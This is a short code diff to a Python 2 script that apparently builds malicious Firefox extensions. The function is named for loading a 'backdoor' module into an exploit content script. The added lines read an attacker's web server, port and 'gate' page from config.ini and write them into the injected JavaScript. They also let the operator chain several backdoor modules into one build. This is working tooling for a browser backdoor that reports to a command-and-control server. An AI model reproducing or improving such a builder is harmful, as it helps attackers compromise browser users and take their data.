@@ -131,11 +131,21 @@ def load_module(backdoor_name):
 				original_check = open('includes/exploit/firefox/data/content.js')
 			if original_check != '':
 				for line in original_check:
+					if "//ENVVAR//" in line:
+						config_file = open('config.ini').read()
+						server_var  = config_file.split('SERVER_WEB=')[1].split('#')[0]
+						server_port = config_file.split('SERVER_PORT=')[1].split('#')[0]
+						server_gate = config_file.split('SERVER_GATE=')[1].split('#')[0]
+						config_var = "var server_web = '"+server_var+":"+server_port+"';\nvar gate_page = '"+server_gate+"';"
+						line = line.replace('//ENVVAR//', config_var)
 					if "//MODULE//" in line:
-						line = line.replace("//MODULE//", load_module_content)
+						line = line.replace("//MODULE//", load_module_content+'\n //MODULE//')
 					load_check.write(line)
 				print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Module writed! '
-				action = 1
+				load_check.close()
+				user_input = raw_input('Load other module ? [y/N] ')
+				if user_input == '' or user_input == 'n' or user_input == 'N':
+					action = 1
 
 def making(information_array):
 	output_name = raw_input('Output Name : ')
